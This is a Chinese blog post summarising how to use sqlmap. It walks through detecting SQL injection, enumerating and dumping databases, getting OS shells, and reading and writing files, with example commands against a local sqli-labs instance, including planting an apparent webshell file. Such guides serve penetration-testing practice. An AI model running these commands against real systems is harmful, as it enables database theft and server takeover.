---
title: Sqlmap注入使用技巧总结
date: 2020-01-11 13:13:05
tags:
    - Sqlmap
    - SQL注入
    - 软件
categories:
    - 笔记总结
    - 软件运用
---

## 简介
Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令
支持的数据库：
> MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase and SAP MaxDB 

SQL注入技术：
> boolean-based blind, time-based blind, error-based, UNION query, stacked queries and out-of-band

枚举数据：
> users, password hashes, privileges, roles, databases, tables and columns

<!--more-->

## 快速上手
1. 对url进行检测，判断是否存在SQL注入
> sqlmap -u "url" --batch
2. 获取当前数据库
> sqlmap -u URL --current-db
3. 获取当前数据库里所有表
> sqlmap -u URL -D database --tables
4. 获取当前数据库表里的字段
> sqlmap -u URL -D database -T tablename --columns
5. 获取字段内容
> sqlmap -u URL -D database -T tablename -C columnsname --dump

## SQLMAP检测参数
```bash
--current-user      检索当前用户
--current-db        检索当前数据库
-is-dba 当前用户权限（是否为root权限）
-dbs 所有数据库
--users             列出用户列表
--passwords         列出用户密码的hash值
--os-shell          提示为交互式操作系统shell
--os-pwn            提示为OOB外壳，Meterpreter或VNC
--batch             永远不要要求用户输入，使用默认行为
--sql-shell         提示输入交互式sqlmap shell
请求:
    这些选项可用于指定如何连接到目标URL
    --data=DATA         数据字符串通过POST发送
    --cookie=COOKIE     HTTP Cookie的值
    --random-agent      随机选择 HTTP User-Agent 头的值
    --proxy=PROXY       使用代理去连接目标URL
    --tor               使用匿名网络
    --check-tor         检查Tor是否正确使用

File system access（访问文件系统）：
这些选项可以被用来访问后端数据库管理系统的底层文件系统。

    –file-read=RFILE 从后端的数据库管理系统文件系统读取文件
    –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
    –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

Optimization（优化）：
这些选项可用于优化SqlMap的性能。
    -o 开启所有优化开关
    –predict-output 预测常见的查询输出
    –keep-alive 使用持久的HTTP（S）连接
    –null-connection 从没有实际的HTTP响应体中检索页面长度
    –threads=THREADS 最大的HTTP（S）请求并发量（默认为1）

Injection（注入）：
这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
    -p TESTPARAMETER 可测试的参数（S）
    –dbms=DBMS 强制后端的DBMS为此值
    –os=OS 强制后端的DBMS操作系统为这个值
    –prefix=PREFIX 注入payload字符串前缀
    –suffix=SUFFIX 注入payload字符串后缀
    –tamper=TAMPER 使用给定的脚本（S）篡改注入数据

Detection（检测）：
这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
    –level=LEVEL 执行测试的等级（1-5，默认为1）
    –risk=RISK 执行测试的风险（0-3，默认为1）
    –string=STRING 查询时有效时在页面匹配字符串
    –regexp=REGEXP 查询时有效时在页面匹配正则表达式
    –text-only 仅基于在文本内容比较网页

Techniques（技巧）：
这些选项可用于调整具体的SQL注入测试。
    –technique=TECH SQL注入技术测试（默认BEUST）
    –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
    –union-cols=UCOLS 定列范围用于测试UNION查询注入
    –union-char=UCHAR 用于暴力猜解列数的字符

Fingerprint（指纹）：
    -f, –fingerprint 执行检查广泛的DBMS版本指纹

Brute force（蛮力）：
这些选项可以被用来运行蛮力检查。
    –common-tables 检查存在共同表
    –common-columns 检查存在共同列
```

## 不同传参方式注入
### GET
> sqlmap -u <url>
### POST
1. 从抓取文件中检测
> sqlmap -r <filename>
2. 从指定参数检测
> sqlmap --data "uname=1&password=2" -p uname
3. 自动检测表单传入参数
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-11/" --forms --batch --threads 10 --current-db
### Cookies
> sqlmap -r <filename> --level 2
### PUT

## 常用参数
1. **-–batch** 默认选项运行
2. **--dbs** 爆破数据库
3. **-–technique** 指定sqlmap使用的检测技术
    - B:Boolean-based-blind （布尔型注入）
    - U:Union query-based （联合注入）
    - E:Error-based （报错型注入)
    - S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）
    - T:Time-based blind （基于时间延迟注入）
4. * **-r** 读取抓包文件
5. * **-p** 需要检测的参数
6. * **--threads** 线程数
7. * **-data** 传入post参数（免去抓包）
* **--level** 

    level: 设置检测的方方面面和测试用例
        - 默认是1,会尝试POST和GET
        - 2:Cookie也会加入检测
        - 3:User-Agent和Referer也会检测, 更大的值会增加用例量

8. * **--user-agent** 指定User-Agent

9. * **--data** 指定请求的内容

10. * **--dbms** 指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例.

11. * **--fresh-queries** fresh-queries会忽略之前的查询结果,进行重新请求操作

12. * **--flush-session** flush-session会清空当前URL相关的session

## 实战案例

1. 读取flag.php文件内容
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-1/index.php?id=1" --file-read "E:\\flag.php"
2. 将mm.php写入目标网站根目录
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1" --file-write "/home/bb/mm.php" --file-dest "E:\\mm.php" --batch
3. 默认参数的报错注入检测
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1" --batch --dbs --threads 10 --technique E
> sqlmap -r 1.txt --batch --dbs --threads 100 --technique ES --level 3
4. 检测POST请求参数是否有注入点
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1" --forms --dbs --batch
5. 使用多个tamper进行检测
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-7/index.php?id=1" --tamper "xx.py" --batch --dbs

## 参考文章
[官方地址](http://sqlmap.org)
[Github地址](https://github.com/sqlmapproject/sqlmap)
[中文使用说明](http://www.91ri.org/6775.html)
[sqlmap使用笔记](https://www.cnblogs.com/coder2012/p/3939703.html)
[sqlmap注入教程](https://www.cnblogs.com/ichunqiu/p/5805108.html)